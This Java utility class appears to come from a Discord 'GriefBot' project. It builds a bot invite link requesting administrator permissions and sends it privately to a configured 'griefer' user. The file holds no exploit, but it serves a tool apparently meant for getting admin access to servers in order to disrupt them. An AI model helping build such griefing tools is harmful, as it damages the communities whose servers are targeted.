package de.corruptedbytes.utils;

import java.util.Base64;
import de.corruptedbytes.GriefBot;
import net.dv8tion.jda.api.entities.User;

public class Utils {

	public static void sendInfo() {
		int guilds = GriefBot.getInstance().getBotManager().getGuilds().size();

		System.out.println();

		if (guilds != 0) {
			System.out.println("The Bot is currently on " + guilds + " servers");
		} else {
			String link = "https://discord.com/api/oauth2/authorize?client_id="
					+ new String(
							Base64.getDecoder().decode(GriefBot.getInstance().getDiscordBotToken().split("\\.")[0]))
					+ "&permissions=8&scope=bot\n";

			try {
				User user = GriefBot.getInstance().getBotManager()
						.getUserById(GriefBot.getInstance().getGrieferUserID());
				user.openPrivateChannel().queue((channel) -> {
					channel.sendMessage("**Bot Invite Link:**\n" + link).queue();
				});

			} catch (Exception e) {
				System.out.println(" Invite Link: " + link);
			}
		}
	}
}
